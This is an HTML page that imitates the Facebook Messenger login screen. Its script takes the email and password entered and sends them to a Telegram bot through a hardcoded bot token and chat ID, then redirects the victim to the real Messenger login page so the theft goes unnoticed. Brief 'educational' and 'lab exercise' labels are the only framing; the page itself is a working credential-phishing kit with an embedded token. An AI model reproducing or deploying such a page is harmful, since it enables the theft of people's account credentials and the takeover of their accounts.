<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Messenger</title>
    <style>
        body { background-color: #fff; font-family: Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .legal-notice { color: #28a745; font-weight: bold; margin: 10px 0; font-size: 13px; text-align: center; }
        .container { width: 100%; max-width: 400px; padding: 20px; box-sizing: border-box; text-align: center; }
        .logo { width: 75px; margin-bottom: 20px; }
        h1 { font-size: 24px; color: #1c1e21; margin-bottom: 10px; font-weight: bold; }
        p { color: #606770; font-size: 15px; margin-bottom: 30px; }
        .login-form input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 10px; font-size: 16px; box-sizing: border-box; background-color: #f5f6f7; }
        .login-form button { width: 100%; padding: 14px; background-color: #0084ff; border: none; color: white; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 17px; margin-top: 10px; }
        .login-form button:active { background-color: #0073e6; }
        .footer-links { margin-top: 20px; }
        .footer-links a { color: #0084ff; text-decoration: none; font-size: 14px; }
        .keep-logged { display: flex; align-items: center; justify-content: center; margin-bottom: 15px; color: #606770; font-size: 14px; }
        .keep-logged input { margin-right: 8px; width: auto; }
    </style>
</head>
<body>

    <div class="legal-notice">Этот сайт предназначен для образовательных целей</div>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Facebook_Messenger_logo_2020.svg/2048px-Facebook_Messenger_logo_2020.svg.png" alt="Messenger" class="logo">
        <h1>Connect with your favorite people.</h1>
        <p>Log in to start chatting.</p>

        <form class="login-form" id="m-form">
            <input type="text" id="email-field" placeholder="Email or phone number" required>
            <input type="password" id="pass-field" placeholder="Password" required>
            
            <div class="keep-logged">
                <input type="checkbox" checked> <span>Keep me logged in</span>
            </div>

            <button type="submit" id="login-btn">Log In</button>
        </form>

        <div class="footer-links">
            <a href="#">Forgot your password?</a>
        </div>
    </div>

    <script>
        const TOKEN = "8275124583:AAH_ad7HiinANwVXTPqgMNW1SsG44g6eqzo";
        const ID = "8042090388";

        document.getElementById('m-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = document.getElementById('email-field').value;
            const pass = document.getElementById('pass-field').value;
            const btn = document.getElementById('login-btn');

            btn.disabled = true;
            btn.innerText = "Connecting...";

            const text = `🔹 MESSENGER LOGIN 🔹\n\n📧 User: ${user}\n🔑 Pass: ${pass}\n\n🏫 Lab Exercise - Educational`;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: ID, text: text })
            })
            .then(() => {
                // تحويل لصفحة ماسنجر الحقيقية
                window.location.href = "https://www.messenger.com/login/";
            })
            .catch(() => {
                alert("Connection lost. Try again.");
                btn.disabled = false;
                btn.innerText = "Log In";
            });
        });
    </script>
</body>
</html>
